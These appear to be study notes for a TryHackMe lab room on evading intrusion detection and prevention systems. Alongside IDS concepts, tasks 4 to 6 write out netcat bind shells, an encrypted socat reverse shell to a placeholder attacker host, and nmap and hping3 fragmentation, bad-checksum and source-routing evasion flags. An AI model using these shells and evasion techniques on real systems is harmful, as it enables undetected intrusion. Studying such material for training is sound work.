# room
https://tryhackme.com/room/redteamnetsec

# task 1 - intro to IDS
* IDS - intrusion detection system
* IDS detects network or system intrusions
* IPS - intrusion prevention system
* IPS detects and prevents network or system intrusions
* IDS types
    * HIDS - host based IDS
        * installed as an application on the client OS
        * monitors local processes and activity
    * NIDS - network based IDS
        * a dedicated network appliance that monitors network traffic
        * connects through a port mirror on a network switch

# task 2 - IDS engine types
* network traffic classification
    * benign - normal everyday traffic
    * malicious - abnormal traffic that is not seen under normal circumstances
* IDS detection engines
    * signature based
        * requires full knowledge of malicious traffic
        * must create rules to match traffic
    * anomaly based
        * requires IDS to have knowledge of what regular traffic looks like
        * requires traffic baseline

# task 3 - IDS/IPS rule triggering
* each IDS/IPS has a certain syntax to write rules
* rule options
    * actions: alert, log, pass, drop, reject
    * protocols: tcp, udp, icmp, ip
    * source ip/source port
    * direction of flow
    * destination ip/destination port

# task 4 - evasion via protocol manipulation
* evading signature-based IDS/IPS requires that you manipulate traffic so it doesn't match the signatures
* four approaches to evasion
    * protocol manipulation
    * payload manipulation
    * route manipulation
    * tactical denail of service
* evasion via protocol manipulation
    * rely on different protocol
    * manipulate source tcp/udp port
    * use session splicing (IP packet fragmentation)
    * send invalid packets
* rely on different protocol
    * IDS/IPS might be configured to block some but allow others
    * using netcat to listen on allowed application ports
        * nc -nvlp 25
        * nc -nvlp 162
* manipulate source tcp/udp port
    * make your traffic appear to be another application
        * for nmap scans
            * nmap -g 80
            * nmap -g 53
        * for a connection through dns
            * nc -nvlpu 53
            * nc -u [attacker_ip] 53
        * for a connection through web
            * nc -nvlp 80
            * nc -u [attacker_ip] 80
* use session splicing
    * break packets related to an attack into smaller packets to avoid IDS signatures
        * if the IDS reassembles the packets, this won't work
    * nmap offers a few fragment options
        * -f - set data to 8 bytes
        * -ff - set data to 16 bytes at most
        * -mtu [size] - custom size, should be a multiple of 8
    * fragroute
        * https://www.monkey.org/~dugsong/fragroute/
* send invalid packets
    * response to valid packets is predictable
    * IDS/IPS might process an invalid packet while the end system may ignore it
    * nmap invalid packets
        * --badsum - creates a bad checksum
        * --scanflags - change flags that packets are sent with
            * --scanflags SYNRSTFIN
    * hping3 allows you to craft packets with custom fields
        * -t - set ttl
        * -b - set bad checksum
        * -S, -A, -P, -U, -F, -R - set individual flags

# task 5 - evasion via payload manipulation
* evasion via payload manipulation
    * obfuscating and encoding the payload
    * encryptiong the communication channel
    * modifying the shellcode
* obfuscating and encoding the payload
    * add extra bytes
    * obfuscate attack data
    * encrypt communication
    * nc -nvlp 1234 -e /bin/bash
* encode to base64
    * base64
* url encoding
    * converts certain characters to %HH where HH is the hex to ascii representation
    * urlencode
    * urlencode ncat -nvlp 1234 -e /bin/bash
* use escaped unicode
    * some systems still executed properly escaped unicode
    * cyberchef
* encrypt the communication channel
    * IDS/IPS won't inspect encrypted data
    * socat can use encryption
    * steps to an encrypted reverse shell
        * create key
            * openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=example.thm/O=test/C=US' -nodes -keyout thm-reverse.key -out thm-reverse.crt
            * cat thm-reverse.key thm-reverse.crt > thm-reverse.pem
        * listen on attacker machine
            * socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT
        * connect from victim
            * socat OPENSSL:1.2.3.4:4443,verfiy=0 EXEC:/bin/bash
    * non-encrypted socat shell example
        * socat -d -d TCP-LISTEN:4443,fork STDOUT
        * socat TCP:1.2.3.4:4443 EXEC:/bin/bash
* modify the data
    * example bind shell
        * nc -nvlp 1234 -e /bin/bash

# task 6 - evasion via route manipulation
* evasion via route manipulation
    * rely on source routing
    * using proxy servers
* source routing
    * loose
        * nmap --ip-options "L 10.10.10.50 10.10.50.250"
    * strict
        * nmap --ip-options "S 10.10.10.1 10.10.20.2 10.10.30.3"
* proxy servers
    * nmap -sS http://proxy:8080,SOCKS4://proxy_host:1234 1.2.3.4
* nmap supports HTTP and SOCKS4 proxies

# task 7 - evasion via tactical dos
* evasion via tactical dos
    * launch dos against IDS/IPS
    * launch dos against log server
* huge amounts of benign traffic may overload the IDS/IPS processing power
* huge amounts of benign traffic may complicate review of the logs

# task 8 - c2 and IDS/IPS evasion
* c2 variable controls
    * user-agent
    * sleep time
    * jitter
    * ssl certificate
    * dns beacon

# task 9 - next gen security
* next gen
    * should achieve what current gen can
    * full app stack visibility
    * context awareness to use outside sources to classify data
    * content awareness through file classification
    * agile to support upgrades via advancements in the engine

# task 10 - summary
* summary